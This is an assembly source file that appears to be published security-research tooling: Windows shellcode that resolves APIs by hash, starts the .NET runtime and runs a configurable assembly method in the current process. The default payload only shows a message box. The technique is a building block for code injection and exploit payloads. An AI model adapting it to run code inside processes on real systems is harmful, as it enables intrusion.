; Shellcode to load a .NET assembly into the current process
; Written for NASM assembler (http://www.nasm.us) by Didier Stevens
; https://DidierStevens.com
; Use at your own risk
;
; History:
;   2010/03/24: start
;		2010/03/25: replaced CorBindToRuntimeEx with CorBindToRuntime

BITS 32

; Customize the following 4 DOTNET_ values according to your needs
%define DOTNET_ASSEMBLY_VALUE "C:\HelloWorldClass.dll"
%define DOTNET_CLASS_VALUE "DidierStevens.HelloWorld"
%define DOTNET_METHOD_VALUE "HelloWorldMessageBox"
%define DOTNET_ARGUMENT_VALUE "Call from shellcode sc-dotNET"

KERNEL32_HASH equ 0x000d4e88
KERNEL32_NUMBER_OF_FUNCTIONS equ 2
KERNEL32_LOADLIBRARYA_HASH			equ 0x000d5786
KERNEL32_GETPROCADDRESS_HASH		equ 0x00348bfa

MSCOREE_HASH equ 0x0006d468
MSCOREE_NUMBER_OF_FUNCTIONS equ 1
MSCOREE_CORBINDTORUNTIME_HASH equ 0x00d09806

segment .text
	call geteip
geteip:
	pop ebx

  ; Setup environment kernel32
	lea esi, [KERNEL32_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [KERNEL32_HASHES_TABLE-geteip+ebx]
	push esi
	push byte KERNEL32_NUMBER_OF_FUNCTIONS
	push KERNEL32_HASH
	call LookupFunctions

	; Setup environment MSCOREE.dll
	lea esi, [MSCOREEDLL-geteip+ebx]
	push esi
	call [KERNEL32_LOADLIBRARY-geteip+ebx]
	lea esi, [MSCOREE_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [MSCOREE_HASHES_TABLE-geteip+ebx]
	push esi
	push byte MSCOREE_NUMBER_OF_FUNCTIONS
	push MSCOREE_HASH
	call LookupFunctions

	; hr = CorBindToRuntime(NULL, NULL, CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (PVOID*) &pClrHost);
	lea esi, [CLR_HOST-geteip+ebx]
	push esi
	lea esi, [IID_ICLRRUNTIMEHOST-geteip+ebx]
	push esi
	lea esi, [CLSID_CLRRUNTIMEHOST-geteip+ebx]
	push esi
	xor edi, edi
	push edi
	push edi
	call [MSCOREE_CORBINDTORUNTIME-geteip+ebx]
	test eax, eax
	jnz done
	
	; pClrHost->Start();
	mov edx, [CLR_HOST-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx+0x0C]
	
	; hr = pClrHost->ExecuteInDefaultAppDomain(L"C:\HelloWorldClass.dll", L"DidierStevens.HelloWorld", L"HelloWorldMessageBox", L"Call from shellcode sc-dotNET", &retVal);
	lea esi, [RETURN_VALUE-geteip+ebx]
	push esi
	lea esi, [DOTNET_ARGUMENT-geteip+ebx]
	push esi
	lea esi, [DOTNET_METHOD-geteip+ebx]
	push esi
	lea esi, [DOTNET_CLASS-geteip+ebx]
	push esi
	lea esi, [DOTNET_ASSEMBLY-geteip+ebx]
	push esi
	mov edx, [CLR_HOST-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx+0x2C]
		
done:
	ret

%include "sc-api-functions.asm"

KERNEL32_HASHES_TABLE:
	dd KERNEL32_LOADLIBRARYA_HASH
	dd KERNEL32_GETPROCADDRESS_HASH

KERNEL32_FUNCTIONS_TABLE:
KERNEL32_LOADLIBRARY			dd 0x00000000
KERNEL32_GETPROCADDRA			dd 0x00000000

MSCOREE_HASHES_TABLE:
	dd MSCOREE_CORBINDTORUNTIME_HASH

MSCOREE_FUNCTIONS_TABLE:
MSCOREE_CORBINDTORUNTIME		dd 0x00000000

CLSID_CLRRUNTIMEHOST:
db 0x6E, 0xA0, 0xF1, 0x90, 0x12, 0x77, 0x62, 0x47, 0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02
IID_ICLRRUNTIMEHOST:
db 0x6C, 0xA0, 0xF1, 0x90, 0x12, 0x77, 0x62, 0x47, 0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02

CLR_HOST			dd 0x00000000
RETURN_VALUE	dd 0x00000000

MSCOREEDLL:
	db "MSCOREE.dll", 0
DOTNET_CLASS:
	db __utf16__(DOTNET_CLASS_VALUE), 0, 0
DOTNET_METHOD:
	db __utf16__(DOTNET_METHOD_VALUE), 0, 0
DOTNET_ARGUMENT:
	db __utf16__(DOTNET_ARGUMENT_VALUE), 0, 0
DOTNET_ASSEMBLY:
	db __utf16__(DOTNET_ASSEMBLY_VALUE), 0, 0
